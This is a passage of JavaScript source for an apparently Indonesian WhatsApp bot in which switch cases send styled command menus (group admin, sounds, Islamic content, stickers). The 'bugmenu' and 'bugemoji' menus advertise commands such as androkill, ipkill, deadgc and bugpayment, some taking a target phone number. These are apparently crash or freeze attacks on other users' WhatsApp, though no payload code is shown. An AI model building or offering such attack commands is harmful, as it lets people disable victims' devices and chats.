📄 ${prefix}𝚋𝚞𝚐𝚖𝚎𝚗𝚞
📄 ${prefix}𝚋𝚞𝚐𝚎𝚖𝚘𝚓𝚒
📄 ${prefix}𝚕𝚒𝚜𝚝𝚖𝚞𝚜𝚒𝚔
📄 ${prefix}𝚌𝚞𝚌𝚒𝚖𝚊𝚝𝚊
📄 ${prefix}𝚛𝚊𝚗𝚍𝚘𝚖𝚖𝚎𝚗𝚞
📄 ${prefix}𝚐𝚊𝚜𝚖𝚎𝚗𝚞
📄 ${prefix}𝚞𝚗𝚖𝚎𝚗𝚞
📄 ${prefix}𝚒𝚜𝚕𝚊𝚖𝚖𝚎𝚗𝚞
📄 ${prefix}𝚐𝚎𝚝𝚜𝚌
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
soundnya = fs.readFileSync(`./menubot.m4a`)
await sleep(100)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, seconds: 9999999999999999 }, {quoted:troli})
break
case 'test': case 'runtime': case 'f': case 'tes':
replywalu(`𝐁𝐎𝐓 𝐎𝐍 𝐒𝐄𝐋𝐀𝐌𝐀 : ${('Runtime; '+runtime(process.uptime()))}`)
break
case 'groupmenu': case 'grubmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) ✓
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚓𝚘𝚒𝚗
📄 ${prefix}𝚕𝚎𝚊𝚟𝚎
📄 ${prefix}𝚙𝚎𝚜𝚊𝚗𝚜𝚎𝚖𝚎𝚗𝚝𝚊𝚛𝚊
📄 ${prefix}𝚛𝚎𝚜𝚎𝚝𝚕𝚒𝚗𝚔𝚐𝚌
📄 ${prefix}𝚎𝚍𝚒𝚝𝚜𝚞𝚋𝚓𝚎𝚔 
📄 ${prefix}𝚎𝚍𝚒𝚝𝚍𝚎𝚜𝚔 
📄 ${prefix}𝚎𝚍𝚒𝚝𝚐𝚛𝚘𝚞𝚙
📄 ${prefix}𝚛𝚞𝚕𝚎𝚜
📄 ${prefix}𝚛𝚞𝚕𝚎𝚜𝚋𝚘𝚝
📄 ${prefix}𝚊𝚍𝚍
📄 ${prefix}𝚔𝚒𝚌𝚔
📄 ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
📄 ${prefix}𝚜𝚎𝚗𝚍𝚕𝚒𝚗𝚔𝚐𝚌
📄 ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎
📄 ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎
📄 ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐
📄 ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕
📄 ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘
📄 ${prefix}𝚝𝚘𝚝𝚊𝚐
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'bugmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) ✓
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚜𝚎𝚗𝚍𝚐𝚊𝚜𝚏𝚞𝚕𝚕 
📄 ${prefix}𝚋𝚞𝚐𝚙𝚊𝚢𝚖𝚎𝚗𝚝
📄 ${prefix}𝚐𝚊𝚜𝚏𝚞𝚕𝚕𝚐𝚌
📄 ${prefix}𝚜𝚊𝚗𝚝𝚎𝚝
📄 ${prefix}𝚜𝚊𝚗𝚝𝚎𝚝𝚐𝚌
📄 ${prefix}𝚍𝚘𝚌𝚞𝚡
📄 ${prefix}𝚌𝚕𝚎𝚊𝚛𝚐𝚌
📄 ${prefix}𝚖𝚊𝚝𝚒𝚐𝚌
📄 ${prefix}𝚍𝚎𝚊𝚍𝚐𝚌
📄 ${prefix}𝚋𝚊𝚗𝚝𝚊𝚒𝚐𝚌
📄 ${prefix}𝚞𝚗𝚕𝚒𝚙𝚎𝚗𝚍𝚒𝚗𝚐
📄 ${prefix}𝚞𝚗𝚕𝚒𝚊𝚝𝚝𝚎𝚗𝚝𝚒𝚘𝚗
📄 ${prefix}𝚞𝚗𝚕𝚒𝚗𝚎𝚐𝚛𝚘
📄 ${prefix}𝚞𝚗𝚕𝚒𝚜𝚌𝚑𝚎𝚍𝚞𝚕𝚎
📄 ${prefix}𝚡𝚊𝚗𝚍𝚛𝚘
📄 ${prefix}𝚡𝚜𝚒𝚜𝚝𝚎𝚖
📄 ${prefix}𝚡𝚜𝚌𝚑𝚎𝚍𝚞𝚕𝚎
📄 ${prefix}++𝚜𝚌𝚑𝚎𝚍𝚞𝚕𝚎
📄 ${prefix}𝚂𝙲𝙷𝙴𝙳𝚄𝙻𝙴𝙾𝙱𝙹𝙴𝙲𝚃 
📄 ${prefix}𝚊𝚗𝚍𝚛𝚘𝚔𝚒𝚕𝚕
📄 ${prefix}𝚒𝚙𝚔𝚒𝚕𝚕
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'bugemoji':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) ✓
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix}👺 (628xxxx)
${prefix}🐵 (628xxxx)
${prefix}🌷 (628xxxx)
${prefix}🐲 (628xxxx)
${prefix}🐉 (628xxxx)
${prefix}🌵 (628xxxx)
${prefix}🎄 (628xxxx)
${prefix}🌲 (628xxxx)
${prefix}🌳 (628xxxx)
${prefix}🌴 (628xxxx)
${prefix}🌱 (628xxxx)
${prefix}🌿 (628xxxx)
${prefix}☘️ (628xxxx)
${prefix}🍀 (628xxxx)
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'unmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) ✓
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚝𝚒𝚗𝚓𝚊𝚞
📄 ${prefix}𝚝𝚎𝚡𝚝𝚞𝚗𝚋𝚊𝚗𝟷
📄 ${prefix}𝚝𝚎𝚡𝚝𝚞𝚗𝚋𝚊𝚗𝟸
📄 ${prefix}𝚝𝚎𝚡𝚝𝚞𝚗𝚋𝚊𝚗𝟹
📄 ${prefix}𝚝𝚎𝚡𝚝𝚞𝚗𝚋𝚊𝚗𝟺
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'listmusik': case 'soundmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏 
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) X
Ⓟ (Premium) X
Ⓕ (Free) ✓
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟸𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟹𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟺𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟻𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟼𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟼𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟼𝟷
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'islammenu': case 'islamic': case 'islammic':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) X
Ⓟ (Premium) X
Ⓕ (Free) ✓
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚕𝚒𝚜𝚝𝚜𝚞𝚛𝚊𝚑
📄 ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
📄 ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗𝚊𝚞𝚍𝚒𝚘
📄 ${prefix}𝚊𝚜𝚖𝚊𝚞𝚕𝚑𝚞𝚜𝚗𝚊 
📄 ${prefix}𝚔𝚒𝚜𝚊𝚑𝚗𝚊𝚋𝚒
📄 ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚜𝚑𝚘𝚕𝚊𝚝 
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'randommenu': case 'gabutmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) X
Ⓟ (Premium) X
Ⓕ (Free) ✓
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
📄 ${prefix}𝚊𝚝𝚝𝚙
